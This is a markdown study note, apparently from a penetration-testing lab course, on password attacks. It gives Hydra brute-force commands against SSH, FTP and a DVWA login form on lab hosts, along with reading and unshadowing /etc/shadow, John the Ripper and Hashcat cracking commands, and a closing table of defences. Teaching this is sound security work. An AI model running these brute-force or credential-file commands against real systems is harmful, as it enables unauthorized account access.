# Password Attacks Notes — Task 4

## Overview
Password attacks aim to gain unauthorized access by obtaining valid credentials through brute force, dictionary attacks, or cracking captured hashes.

---

## 1. SSH Brute Force with Hydra

### What is Hydra?
THC Hydra is a fast and flexible online password cracking tool. It supports 50+ protocols including SSH, FTP, HTTP, RDP, SMB, and more.

### Basic Hydra Syntax
```bash
hydra -l <username> -p <password> <target> <protocol>
hydra -l <username> -P <wordlist> <target> <protocol>
hydra -L <userlist> -P <wordlist> <target> <protocol>
```

### SSH Brute Force Against Metasploitable2
```bash
# Single username, wordlist of passwords
hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100

# Multiple usernames and passwords
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
      -P /usr/share/wordlists/rockyou.txt \
      ssh://192.168.1.100

# With verbose output
hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt \
      -v -V ssh://192.168.1.100

# Limit threads to avoid lockout
hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt \
      -t 4 ssh://192.168.1.100
```

**Hydra Flags:**
| Flag | Meaning |
|------|---------|
| `-l` | Single username |
| `-L` | Username list file |
| `-p` | Single password |
| `-P` | Password list file |
| `-t` | Number of parallel tasks (default 16) |
| `-v` | Verbose mode |
| `-V` | Show each attempt |
| `-s` | Custom port |
| `-f` | Stop after first valid credential |
| `-o` | Save output to file |

**Expected Output:**
```
[22][ssh] host: 192.168.1.100   login: msfadmin   password: msfadmin
1 of 1 target successfully completed, 1 valid password found
```

### FTP Brute Force
```bash
hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.100
```

### HTTP Form Brute Force (DVWA Login)
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
      127.0.0.1 http-post-form \
      "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
```

---

## 2. Password Hash Cracking with John the Ripper

### What is John the Ripper?
John the Ripper (JtR) is an open-source password security auditing and recovery tool supporting hundreds of hash types.

### Basic Usage
```bash
john hashfile.txt                                    # Auto-detect format
john --format=md5 hashfile.txt                       # Specify format
john --wordlist=/usr/share/wordlists/rockyou.txt hashfile.txt   # Dictionary attack
john --show hashfile.txt                             # Show cracked passwords
john --rules hashfile.txt                            # Apply mangling rules
```

### Cracking Linux /etc/shadow Hashes

**Step 1 — Get hashes (after gaining root access)**
```bash
cat /etc/shadow
# root:$6$randomsalt$hashedpassword...:17000:0:99999:7:::
# msfadmin:$1$XN10Zj2c$Rt/ItCf4KioczGFWJIWXI/:14684:0:99999:7:::
```

**Step 2 — Combine passwd and shadow**
```bash
unshadow /etc/passwd /etc/shadow > combined_hashes.txt
```

**Step 3 — Crack with John**
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt combined_hashes.txt
john --show combined_hashes.txt
```

### Hash Format Examples
```bash
# MD5 hash
john --format=raw-md5 --wordlist=rockyou.txt hashes.txt

# SHA-256
john --format=raw-sha256 --wordlist=rockyou.txt hashes.txt

# NTLM (Windows)
john --format=nt --wordlist=rockyou.txt hashes.txt

# bcrypt
john --format=bcrypt --wordlist=rockyou.txt hashes.txt

# SHA-512 crypt (Linux modern)
john --format=sha512crypt --wordlist=rockyou.txt hashes.txt
```

### John Attack Modes
```bash
# Single mode (uses username variations)
john --single hashes.txt

# Wordlist mode
john --wordlist=rockyou.txt hashes.txt

# Incremental (brute force)
john --incremental hashes.txt

# Rules (wordlist + transformations)
john --wordlist=rockyou.txt --rules hashes.txt
```

---

## 3. Hashcat — GPU-Accelerated Cracking

```bash
# MD5
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt

# SHA-1
hashcat -m 100 hashes.txt rockyou.txt

# SHA-256
hashcat -m 1400 hashes.txt rockyou.txt

# NTLM
hashcat -m 1000 hashes.txt rockyou.txt

# bcrypt
hashcat -m 3200 hashes.txt rockyou.txt

# Linux SHA-512 crypt
hashcat -m 1800 hashes.txt rockyou.txt

# Brute force (up to 8 chars, all types)
hashcat -m 0 -a 3 hashes.txt ?a?a?a?a?a?a?a?a

# With rules
hashcat -m 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

---

## 4. Identifying Hash Types

```bash
# Using hash-identifier
hash-identifier
# Enter hash when prompted

# Using hashid
hashid 5f4dcc3b5aa765d61d8327deb882cf99

# Common hash lengths
# 32 chars = MD5
# 40 chars = SHA-1
# 56 chars = SHA-224
# 64 chars = SHA-256
# 128 chars = SHA-512
```

---

## 5. Wordlists

```bash
# Kali Linux wordlists location
ls /usr/share/wordlists/

# Enable rockyou.txt (compressed by default)
gunzip /usr/share/wordlists/rockyou.txt.gz

# SecLists (comprehensive collection)
sudo apt install seclists
ls /usr/share/seclists/Passwords/

# Key wordlists
/usr/share/wordlists/rockyou.txt               # 14M passwords
/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt
/usr/share/seclists/Usernames/top-usernames-shortlist.txt
```

---

## 6. Defense Against Password Attacks

| Attack | Defense |
|--------|---------|
| SSH Brute Force | fail2ban, rate limiting, key-based auth only |
| Online brute force | Account lockout after N attempts |
| Hash cracking | Use bcrypt/Argon2 with high work factor |
| Dictionary attack | Enforce strong password policy |
| Credential stuffing | MFA, breach monitoring |
| Pass-the-hash | Disable NTLM, use Kerberos |

```bash
# Install fail2ban to block SSH brute force
sudo apt install fail2ban
sudo systemctl enable fail2ban

# Disable SSH password auth (use keys only)
sudo nano /etc/ssh/sshd_config
# Set: PasswordAuthentication no
sudo systemctl restart ssh
```

---

## Key Takeaways
- Hydra is fast but noisy — rate limiting helps avoid lockouts
- John the Ripper is best for offline hash cracking with complex rules
- Hashcat leverages GPU — dramatically faster than CPU-based cracking
- rockyou.txt covers most weak/common passwords
- `unshadow` is required before John can crack Linux shadow hashes
- Strong hashing (bcrypt/Argon2) + salting makes cracking impractical
